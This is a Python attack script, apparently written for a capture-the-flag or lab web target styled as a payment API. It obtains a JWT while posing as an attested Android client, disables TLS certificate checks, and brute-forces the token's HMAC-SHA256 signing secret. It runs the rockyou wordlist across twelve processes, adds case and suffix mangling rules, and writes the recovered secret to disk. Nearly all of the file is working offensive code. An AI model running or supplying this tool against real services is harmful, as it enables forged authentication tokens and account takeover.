import base64, hashlib, hmac, json, os, ssl, sys, urllib.request, urllib.error
from multiprocessing import Pool

BASE = "https://web-3f25599ac74e8a91.web.h7tex.com"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
CL = "MeridianPay-Android/3.2.1 (attested)"

def mint():
    r = urllib.request.Request(BASE+"/api/v1/auth/device", data=json.dumps({"device_id":"crack"}).encode(),
                               method="POST", headers={"Content-Type":"application/json","X-Meridian-Client":CL})
    with urllib.request.urlopen(r, context=CTX, timeout=15) as f:
        return json.loads(f.read())["token"]

TOKEN = mint()
h0, p0, s0 = TOKEN.split(".")
SIGNING = (h0 + "." + p0).encode()
SIG = base64.urlsafe_b64decode(s0 + "=" * (-len(s0) % 4))
print("target minted, sig len", len(SIG), flush=True)

PATH = "rockyou.txt"
SIZE = os.path.getsize(PATH)
N = 12

SUF = [b"", b"1", b"12", b"123", b"!", b"2026", b"2025", b"2024", b"@1", b"#1", b"01", b"7"]

def crack(rng):
    a, b, rules = rng
    new, sha, cd = hmac.new, hashlib.sha256, hmac.compare_digest
    with open(PATH, "rb") as f:
        f.seek(a)
        if a: f.readline()
        pos = f.tell()
        while pos < b:
            line = f.readline()
            if not line: break
            pos = f.tell()
            k = line.rstrip(b"\r\n")
            if not k: continue
            if cd(new(k, SIGNING, sha).digest(), SIG): return k
            if rules:
                for base in (k, k.capitalize(), k.upper()):
                    for s in SUF:
                        kk = base + s
                        if cd(new(kk, SIGNING, sha).digest(), SIG): return kk
    return None

if __name__ == "__main__":
    step = SIZE // N
    jobs = [(i*step, (i+1)*step if i < N-1 else SIZE, False) for i in range(N)]
    with Pool(N) as pool:
        hit = None
        for r in pool.imap_unordered(crack, jobs):
            if r: hit = r; pool.terminate(); break
    print("PASS1 plain rockyou:", hit, flush=True)
    if not hit:
        HALF = SIZE // 2
        jobs = [(i*(HALF//N), (i+1)*(HALF//N) if i < N-1 else HALF, True) for i in range(N)]
        with Pool(N) as pool:
            for r in pool.imap_unordered(crack, jobs):
                if r: hit = r; pool.terminate(); break
        print("PASS2 rules on first half:", hit, flush=True)
    if hit:
        open("jwt_secret.bin","wb").write(hit)
        print("SECRET:", hit)
